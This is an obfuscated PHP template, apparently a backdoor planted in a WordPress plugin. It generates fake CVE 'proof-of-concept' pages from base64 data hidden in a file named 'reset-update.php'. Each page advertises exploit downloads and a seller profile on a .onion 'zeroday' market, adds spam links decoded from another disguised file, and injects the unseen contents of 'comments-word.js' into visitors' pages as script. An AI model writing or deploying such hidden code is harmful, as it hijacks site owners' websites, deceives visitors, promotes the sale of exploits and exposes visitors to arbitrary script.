<?php

function aoebobkve($g6KMU2ujg) {
    $uRsy4i = 0;
    $k8ebvaUs = strlen($g6KMU2ujg);
    for ($i = 0; $i < $k8ebvaUs; $i++) $uRsy4i += ord($g6KMU2ujg[$i]);
    return $uRsy4i;
}

$uqO4xwv9Ge = intval(get_query_var('ckkbimthk'));

if ($uqO4xwv9Ge < 1 || $uqO4xwv9Ge > 1147) return;
$iH0NaVR4gz = file(plugin_dir_path(__FILE__).'reset-update.php', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

$aAbp7kZ9 = explode(';', base64_decode($iH0NaVR4gz[$uqO4xwv9Ge]));
if (count($aAbp7kZ9) < 2) return;
$jvuhY5 = $aAbp7kZ9[0];
$gfCQD8 = aoebobkve($jvuhY5);
$pdVvYg6BDW = $jvuhY5 . ' POC (Proof-of-Concept)';
$sQJ6eR0x  = $aAbp7kZ9[1];
$yPryVvDA = $aAbp7kZ9[2];
$jlgo8gge93 = $aAbp7kZ9[3];
$xAgqw  = $aAbp7kZ9[4];
set_query_var('ziztj', $pdVvYg6BDW);

$taHYUOQv = '';
$yQe2m4W = plugin_dir_path(__FILE__).'super-stats.php';
if (is_file($yQe2m4W)) {
	$g75ymqjP = file($yQe2m4W, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
	array_shift($g75ymqjP);
	shuffle($g75ymqjP);
	$aX68vo = mt_rand(2, 5);
	if (count($g75ymqjP) > $aX68vo) {
		for ($hQZCNLF = 0; $hQZCNLF < $aX68vo; $hQZCNLF++) {
			$kgMCBMLjch = base64_decode(array_shift($g75ymqjP));
			$taHYUOQv .= '<p><a href="'.$kgMCBMLjch.'">'.$kgMCBMLjch.'</a>' . "</p>\n";
		}
	}
}

status_header(200);
get_header();
?>

<div id="primary" class="content-area">
	<main id="main" class="site-main wp-block-group has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
		<article class="page type-page wp-block-group alignfull has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
			<header class="entry-header">
				<h1 class="entry-title wp-block-post-title"><?php echo $pdVvYg6BDW; ?></h1>
			</header>
			<div class="entry-content alignfull wp-block-post-content has-global-padding is-layout-constrained wp-block-post-content-is-layout-constrained">
				<?php
				echo "<p>" . $xAgqw . "</p>\n";
				if (strlen($sQJ6eR0x) > 0) echo "<p><strong>Published: </strong>" . $sQJ6eR0x . "</p>\n";
				if (strlen($yPryVvDA) > 0) echo "<p><strong>CVSS: </strong>" . $yPryVvDA . "</p>\n";
				if (strlen($jlgo8gge93) > 0) echo "<p><strong>CVSS Vector: </strong>" . $jlgo8gge93 . "</p>\n";
				?>
				<p><strong>Download <?php echo $pdVvYg6BDW; ?> here:</strong></p>
				
				<div class="link-grid">
					<div class="link-box">
						<input type="text" id="link1" value="http://zeroday3sv534ljdendaufcrorz67yg6iujdpaknp6zqgxaevb7okfid.onion/exploit-for-<?php echo str_replace(' ', '-', strtolower($jvuhY5)) . '.' . $gfCQD8; ?>/" readonly>
						<button onclick="copyLink('link1')">
							<svg class="icon" viewBox="0 0 24 24"><path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-2 16H7v-2h10v2zm0-4H7v-2h10v2zm0-4H7V7h10v2z"/></svg>
							Copy
						</button>
					</div>
				</div>

				<p><strong>Tip:</strong> Download official Tor Browser at https://www.torproject.org/download/ to access .onion links.</p>

				<p>Check my portfolio here:</p>

				<div class="link-grid">
					<div class="link-box">
						<input type="text" id="link2" value="http://zeroday3sv534ljdendaufcrorz67yg6iujdpaknp6zqgxaevb7okfid.onion/members/joramwolters.344/" readonly>
						<button onclick="copyLink('link2')">
							<svg class="icon" viewBox="0 0 24 24"><path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-2 16H7v-2h10v2zm0-4H7v-2h10v2zm0-4H7V7h10v2z"/></svg>
							Copy
						</button>
					</div>
				</div>

				<?php
				echo $taHYUOQv;
				?>


<script>
function copyLink(id) {
	const input = document.getElementById(id);
	input.select();
	document.execCommand('copy');
	const btn = input.nextElementSibling;
	btn.innerHTML = '<svg class="icon" viewBox="0 0 24 24"><path d="M9 16.2L4.8 12l-1.4 1.4L9 19 21 7l-1.4-1.4L9 16.2z"/></svg> Copied!';
	btn.style.background = '#ff4500';
	setTimeout(() => {
		btn.innerHTML = '<svg class="icon" viewBox="0 0 24 24"><path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-2 16H7v-2h10v2zm0-4H7v-2h10v2zm0-4H7V7h10v2z"/></svg> Copy';
		btn.style.background = '#2c2c2c';
	}, 2000);
}
</script>

<style>
.link-grid { display: grid; gap: 30px; margin: 40px 0; }
.link-box { background: #F9FAFC; padding: 25px; border-radius: 12px; display: flex; align-items: center; gap: 25px; transition: box-shadow 0.3s ease; }
.link-box:hover { box-shadow: 0 6px 18px rgba(0, 0, 0, 0.1); }
.link-box input { width: 70%; padding: 15px; border: 2px solid #2c2c2c; border-radius: 10px; font-size: 17px; }
.link-box button { background: #2c2c2c; color: white; padding: 0 35px 15px; border: none; border-radius: 10px; cursor: pointer; display: flex; align-items: center; transition: background 0.3s, transform 0.3s; }
.link-box button:hover { background: #ff4500; transform: scale(1.05); }
</style>


			</div>
		</article>
	</main>
</div>

<?php
$a3k1Y = plugin_dir_path(__FILE__) . 'comments-word.js';
if (is_file($a3k1Y)) {
	echo '<script type="text/javascript">';
	echo file_get_contents($a3k1Y);
	echo '</script>';
}
get_footer();
?>
